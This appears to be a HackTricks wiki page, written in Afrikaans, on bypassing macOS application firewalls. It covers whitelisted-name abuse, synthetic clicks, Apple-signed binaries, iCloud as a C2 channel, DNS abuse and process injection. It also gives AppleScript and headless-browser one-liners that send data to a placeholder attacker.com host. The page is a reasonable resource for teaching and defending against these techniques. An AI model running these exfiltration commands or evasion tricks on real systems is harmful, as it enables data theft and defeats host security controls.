# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Gevonde tegnieke

Die volgende tegnieke is gevind wat werk in sommige macOS firewall-apps.

### Misbruik van witlys name

- Byvoorbeeld om die malware te noem met name van bekende macOS prosesse soos **`launchd`**

### Sintetiese Klik

- As die firewall om toestemming van die gebruiker vra, laat die malware **klik op toelaat**

### **Gebruik Apple-onderteken binaries**

- Soos **`curl`**, maar ook ander soos **`whois`**

### Bekende apple domeine

Die firewall kan verbinding met bekende apple domeine soos **`apple.com`** of **`icloud.com`** toelaat. En iCloud kan as 'n C2 gebruik word.

### Generiese Bypass

Sommige idees om te probeer om firewalls te omseil

### Kontroleer toegelate verkeer

Om die toegelate verkeer te ken, sal jou help om potensieel gewhitelist domeine of watter toepassings toegelaat word om toegang tot hulle te verkry.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Misbruik van DNS

DNS-resolusies word gedoen via **`mdnsreponder`** onderteken toepassing wat waarskynlik toegelaat sal word om DNS-bedieners te kontak.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Deur Blaaier toepassings

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Deur prosesinjekties

As jy **kode in 'n proses kan inspuit** wat toegelaat word om met enige bediener te verbind, kan jy die firewall beskerming omseil:

{{#ref}}
macos-proces-abuse/
{{#endref}}

## Verwysings

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

{{#include ../../banners/hacktricks-training.md}}
